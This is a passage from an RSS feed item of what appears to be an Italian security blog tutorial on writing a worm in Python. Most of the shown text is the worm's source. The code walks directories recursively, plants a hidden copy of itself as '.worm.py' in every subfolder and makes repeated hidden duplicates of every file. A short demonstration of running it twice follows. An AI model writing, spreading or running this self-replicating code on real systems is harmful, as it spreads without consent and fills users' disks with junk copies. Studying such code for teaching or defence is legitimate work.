                absolute_path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(path, file)
                print(absolute_path)

                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;isdir(absolute_path):
                    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_directories(absolute_path)
                &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
    
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;create_new_worm&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; directory &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;target_dir_list:
            destination &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(directory, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.worm.py&amp;#34;&lt;/span&gt;)
            &lt;span style=&#34;color:#75715e&#34;&gt;# copy the script in the new directory with similar name&lt;/span&gt;
            shutil&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;copyfile(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;own_path, destination)
            
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;copy_existing_files&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; directory &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;target_dir_list:
            file_list_in_dir &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;listdir(directory)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; file &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; file_list_in_dir:
                abs_path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(directory, file)
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; abs_path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;isdir(abs_path):
                    source &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abs_path
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iteration):
                        destination &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(directory,(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;file&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;str(i)))
                        shutil&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;copyfile(source, destination)
                        
                        
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;start_worm_actions&lt;/span&gt;(self):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_directories(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path)
        print(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;target_dir_list)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create_new_worm()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;copy_existing_files()
        
        
                        
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    current_directory &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;abspath(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
    worm &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Worm(path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;current_directory)
    worm&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start_worm_actions()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Vediamo un esempio pratico, abbiamo creato questa struttura di file di testo e sottocartelle di prova:&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/WriteWormInPython.png&#34;  class=&#34;left&#34;  style=&#34;width: 300px&#34;  /&gt;


&lt;p&gt;Eseguiamo il worm 2 volte con il comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;python3 worm&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ecco il risultato:&lt;/p&gt;

  &lt;img src=&#34;https://kobra3390.github.io/SpaceHack/images/WriteWormInPython2.png&#34;  class=&#34;left&#34;  style=&#34;width: 300px&#34;  /&gt;


</content>
    </item>
    
  </channel>
</rss>
